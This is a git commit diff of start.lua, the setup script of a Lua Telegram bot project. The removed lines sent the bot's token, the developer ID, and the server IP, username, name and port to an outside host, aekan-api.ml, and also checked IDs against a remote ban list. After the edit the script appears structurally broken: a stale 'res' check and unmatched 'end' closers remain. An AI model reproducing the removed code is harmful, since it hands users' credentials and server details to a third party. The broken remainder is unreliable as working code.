9b9f0f0eeae1d74445cb6c4fab7cb947622e2a0a
AEKAN TEAM <58911326+AEKANTEAM@users.noreply.github.com>
2021-05-18 01:19:32 +0300

    Add files via upload

--- start.lua
+++ start.lua
@@ -32,52 +32,32 @@ if not redis:get(Server_Done.."Token_Write") then
 print('\n\27[1;41m ارسل توكن البوت الان : \n\27[0;39;49m')
 local token = io.read()
 if token ~= '' then
-data,res = https.request("https://aekan-api.ml/index.php?p="..GithubUser)
-if res == 200 then
-tr = json:decode(data)
-if tr.Info.info == 'Is_Spam' then
-io.write('\n\27[1;31m'..tr.Info.info..'\n\27[0;39;49m')
-os.execute('lua start.lua')
-end ---ifBn
-if tr.Info.info == 'Ok' then
 local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
 if res ~= 200 then
 io.write('\n\27[1;35m عذرا التوكن خطأ  : \n\27[0;39;49m')
 else
 io.write('\n\27[1;45m تم حفظ التوكن : \n\27[0;39;49m') 
 redis:set(Server_Done.."Token_Write",token)
+os.execute('lua start.lua')
 end ---ifok
 end ---ifok
 else
-io.write('\n\27[1;31m لم يتم حفظ التوكن حاول وقت اخر : \n\27[0;39;49m')
-end  ---ifid
 os.execute('lua start.lua')
 end ---ifnot
-end
 if not redis:get(Server_Done.."UserSudo_Write") then
 print('\n\27[1;41m ارسل ايدي مطور البوت الان : \n\27[0;39;49m')
 local Id = io.read():gsub(' ','') 
 if tostring(Id):match('%d+') then
-data,res = https.request("https://aekan-api.ml/index.php?bn=info&id="..Id)
 if res == 200 then
-muaed = json:decode(data)
-if muaed.Info.info == 'Is_Spam' then
-io.write('\n\27[1;35m عذرا الايدي محظور من السورس \n\27[0;39;49m') 
 os.execute('lua start.lua')
 end ---ifBn
-if muaed.Info.info == 'Ok' then
 io.write('\n\27[1;39m تم حفظ الايدي بنجاح \n\27[0;39;49m') 
 redis:set(Server_Done.."UserSudo_Write",Id)
 end ---ifok
 else
-io.write('\n\27[1;31m تم حفظ الايدي يوجد خطأ : \n\27[0;39;49m')
-end  ---ifid
 os.execute('lua start.lua')
 end ---ifnot
 end
-local function Files_Info_Get()
-Create_Info(redis:get(Server_Done.."Token_Write"),redis:get(Server_Done.."UserSudo_Write"))   
-local t = json:decode(https.request('https://aekan-api.ml/index.php?n=by&id='..redis:get(Server_Done.."UserSudo_Write").."&token="..redis:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
 local RunBot = io.open("Run", 'w')
 RunBot:write([[
 #!/usr/bin/env bash
